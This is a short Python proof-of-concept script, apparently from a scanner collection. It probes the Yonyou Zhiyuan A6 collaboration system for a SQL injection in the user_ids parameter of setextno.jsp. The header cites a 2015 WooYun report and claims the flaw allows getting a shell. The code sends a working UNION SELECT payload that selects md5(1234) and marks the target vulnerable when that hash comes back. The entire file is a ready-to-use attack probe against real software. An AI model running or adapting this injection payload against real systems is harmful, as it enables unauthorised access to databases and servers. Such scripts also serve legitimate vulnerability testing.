#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 用友致远A6协同系统SQL注射union可shell
referer: http://www.wooyun.org/bugs/wooyun-2015-0106478
author: Lucifer
description: /yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?参数user_ids存在注入,可GETSHELL。
'''
import sys
import requests
import warnings
  


class user_ids_sqli:
    def __init__(self, url):
        self.url = url

    def run(self):
        result = ['用友致远A6协同系统SQL注射union可shell','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
            }
        payload = "/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(17)%20UnIoN%20SeLeCt%201,2,md5(1234),1%23"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = user_ids_sqli(sys.argv[1])
    testVuln.run()